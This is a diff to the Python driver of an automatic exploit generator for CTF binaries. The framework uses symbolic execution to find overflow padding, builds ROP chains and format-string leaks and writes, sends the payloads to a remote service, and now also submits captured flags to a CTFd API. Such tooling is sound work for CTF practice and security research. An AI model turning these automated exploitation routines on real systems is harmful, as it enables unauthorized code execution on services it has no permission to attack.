@@ -2,6 +2,8 @@
 import logging
 import argparse
 import os
+import json
+import requests
 
 from pwn import *
 from rage.rage import rAEG
@@ -12,26 +14,33 @@ from rage.log import aegis_log
 class Aegis:
     """Class that does the control flow for analysis and execution."""
 
-    def __init__(self, binary, libc, ip, port):
+    def __init__(self, binary, libc, ip, port, ctfd, flag_format, id):
         """Initiaize important variables for the binary."""
         self.binary = os.path.abspath(binary)
         self.elf = ELF(binary)
         self.rop = ROP(self.elf)
 
-        if libc is not None:
-            self.libc = ELF(libc)
-        else:
-            self.libc = self.elf.libc
+        self.libc = ELF(libc) if libc != None else self.elf.libc
 
         self.ip = ip
         self.port = port
         self.has_format = False
 
+        self.access_token = os.environ.get("CTFD_TOK")
+        self.headers = {
+            "Authorization": f"Token {self.access_token}",
+            "Content-Type" : "application/json",
+        }
+
+        self.ctfd = ctfd
+        self.chal_id = id
+        self.flag_format = flag_format if flag_format is not None else "flag"
+
         self.symbol = rAEG(self.binary)
         self.machine = Machine(self.binary)
         
         self.static_analysis() 
-        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)
+        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port, self.flag_format)
 
         self.symbolic_padding = None
         self.padding = None
@@ -54,38 +63,31 @@ class Aegis:
         """Set variables from the output of the symbolic analysis."""
         self.symbol.stack_smash()
         self.symbolic_padding = self.symbol.symbolic_padding
+        
         if not self.has_format:
-            self.has_format = self.symbol.has_format
+            self.has_format = self.symbol.has_format 
+
         if self.has_format == True:
             aegis_log.info(f"Found printf format string vulnerability")
 
     def setup_exploit(self):
         """Choose which exploit to do for the binary."""
         
+        self.against.chain = b""
+
         win_gadget = self.machine.find_win_gadget()
         function = self.machine.find_functions(["win", "system", "execve", "syscall"])
         string = self.machine.find_string_address()
-        self.against.chain = b""
         writeable = self.machine.find_writeable_address()
 
-        if len(function) > 0:
-            function = function[0]
-        else:
-            function = None
-
-        if self.symbolic_padding != None:
-            #if self.machine.padding_size == len(self.symbolic_padding):
-            self.against.padding = self.symbolic_padding
-            #if self.failed:
-                #self.against.padding = b"A" * self.machine.padding_size
-        else:
-            self.against.padding = b"A" * self.machine.padding_size
+        function = function[0] if len(function) > 0 else None
+        self.against.padding = self.symbolic_padding if self.symbolic_padding != None else b"A" * self.machine.padding_size
 
         if len(self.against.padding) == 0:
             aegis_log.warning(f"Could not find buffer overflow")
 
             if self.has_format == True:
-                self.against.format_leak()
+                self.against.format_leak("")
 
                 if self.against.flag == None:
                     if function == "win":
@@ -97,7 +99,12 @@ class Aegis:
                         self.against.format_write(win_gadget, got_addr)
                         self.exploit()
                 else:
-                    aegis_log.info(f"Found flag through stack leak: {self.against.flag}")
+                    aegis_log.info(f"Found flag through stack leak: {self.against.flag}\nFinding remote flag")
+                    self.against.format_leak("REMOTE")
+
+                    if self.against.remote_flag != None:
+                        aegis_log.info(f"Found flag through stack leak: {self.against.remote_flag}")
+                        self.send_flag(self.against.remote_flag)
 
         else: 
 
@@ -145,28 +152,36 @@ class Aegis:
                     aegis_log.debug(f"Setting up return to dlresolve")
                     self.against.chain = self.against.rop_chain_dlresolve()
             self.exploit()
-                
-
+            
 
     def write_solve_script(self):
         """Write the solve to a script for writeup purposes."""
+
+
+    def send_flag(self, flag):
+        """Sends the flag to ctfd service"""
+        challenge_url = f"{self.ctfd}/api/v1/challenges/attempt"
+        data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
+        response = requests.post(challenge_url, headers=self.headers, data=data)
+        json_data = response.json()
+        message = json_data["data"]["message"]
+
+        aegis_log.critical(f"Response from remote server {message} for {flag}")
+
 
     def exploit(self):
         """Create and run exploit using Against module."""
         aegis_log.debug(f"Setting up exploit")
         chain_len = len(self.against.chain) if self.against.chain is not None else 0
         format_len = len(self.against.format_exploit) if self.against.format_exploit is not None else 0
-        exp = open("exploit", "wb")
 
         if chain_len > 0:
             aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
         else:
             aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")
 
-        if args.GDB:
-            option = "GDB"
-        else:
-            option = ""
+        option = "GDB" if args.GDB else ""
+
         self.against.process = self.against.start(option)
         self.against.send_exploit()
         if self.against.verify_flag() == False:
@@ -188,15 +203,21 @@ class Aegis:
                     aegis_log.debug(f"Sending exploit to remote")
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()                    
-                    self.against.verify_flag()
                     aegis_log.debug(f"Sent exploit to remote")
+                    if self.against.verify_flag() == True:
+                       self.send_flag(self.against.flag) 
+                                    
         else:
             if self.against.flag != None:
                     aegis_log.debug(f"Sending exploit to remote")
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()
-                    self.against.verify_flag()
+                    if self.against.verify_flag() == True:
+                       self.send_flag(self.against.flag) 
+                    
+
                     aegis_log.debug(f"Sent exploit to remote")
+
  
 def print_title():
 
@@ -259,14 +280,16 @@ def print_title():
     ▒▒▒▒░░░░░░░░░░░░     
     ▒▒▒▒▒▒▒▒░░░░░░░░   
     """
-    print(aegis_title)
-    print(pillar)
+    #print(aegis_title)
+    #print(pillar)
 
 if __name__ == "__main__":
     logging.getLogger("angr").setLevel(logging.CRITICAL)
     logging.getLogger("os").setLevel(logging.CRITICAL)
     logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
     logging.getLogger("aegis_log").setLevel(logging.DEBUG)
+    #logging.getLogger("aegis_log").setLevel(logging.CRITICAL)
+
     parser = argparse.ArgumentParser( 
         prog = "Aegis", 
         description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
@@ -279,11 +302,13 @@ if __name__ == "__main__":
     parser.add_argument("-login", metavar="login", type=str, help="Your login to your ctfd account", default=None)
     parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
     parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)
+    parser.add_argument("-id", metavar="challengeid", type=str, help="The ctfd challenge id", default=None)
+    
 
     arguments = parser.parse_args()
     print_title()
 
-    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port)
+    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, None, arguments.id)
     aeg.static_analysis()
     aeg.symbolic_analysis()
     aeg.setup_exploit()
